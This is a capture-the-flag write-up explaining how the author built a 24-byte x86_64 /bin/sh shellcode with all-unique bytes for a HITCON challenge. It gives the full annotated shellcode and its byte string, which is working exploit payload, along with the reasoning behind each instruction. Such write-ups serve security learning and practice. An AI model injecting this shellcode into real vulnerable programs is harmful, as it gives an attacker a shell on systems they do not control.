# Misc - Easy to say

> Write-up by feignix (Paras Chetal)

We were supposed to write a x86_64 /bin/sh shellcode of less than 24 bytes with all bytes unique.

## Shellcode:


```

\xb0\x3b	;mov al, 0x3b

\xbb\xf4\x2e\x73\x68   ;mov ebx,0x68732ef4

\x01\xc3	     ;add bx,ax "//sh"

\x48\xc1\xe3\x20     ;shl rbx, 0x20

\x53	     ;push rbx

\x54	     ;push rsp

\x5f	     ;pop rdi

\xc7\x07\x2f\x62\x69\x6e;	  mov [rdi], 0x6e69622f "/bin"

\x0f\x05		  ;syscall
```


`\xb0\x3b\xbb\xf4\x2e\x73\x68\x01\xc3\x48\xc1\xe3\x20\x53\x54\x5f\xc7\x07\x2f\x62\x69\x6e\x0f\x05`


## Steps (rasm2 came in very handy while debugging):

The stack and registers were cleared out already, so we needed to load the registers with the correct values and run syscall.

The first hurdle was to ensure that all bytes  be unique. This meant that we could not just directly load the address of "/bin//sh" (0x68732f2f6e69622f) into rdi as is usually the case. We would have to create it with all unique bytes. Unfortunately, most of the operations (mov, add etc.) involving the r* registers begin with `\x48` so it meant we could only use one such instruction. I chose to first move "//sh" to ebx (no 0x48 here), and then use the shift left instruction on rbx (0x48 used) and then push it appropriately.

But directly moving "//sh" was not an option (unique bytes!), so I created it by moving (0x68732f2f - 0x3b) into ebx, and then adding ax (0x3b: which was already needed for the syscall, so I was trying to saving bytes). Then I shifted rbx by 32 bits and and pushed it onto the stack.

I now had to mov "/bin" to the stack too. This was the second big hurdle I faced. I initially used `mov [rsp], 0x6e69622f "/bin"`, followed by loading of address to rdi and then syscall. Unfortunately, the shellcode came out to be 25 bytes!

While trying other apporaches I discovred that `mov [rdi], 0x6e69622f "/bin"` took exactly 1 byte less than `mov [rsp], 0x6e69622f "/bin"` ! So I rearranged my earlier shellcode to  load the stack ("/bin//sh") address to rdi before moving "/bin" onto the stack using `mov [rdi]` instead of `mov [rsp]` this time. Now the shellcode was 24 bytes only :)

After [sending the shellcode](exp.py), I got shell and read the flag: `hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}`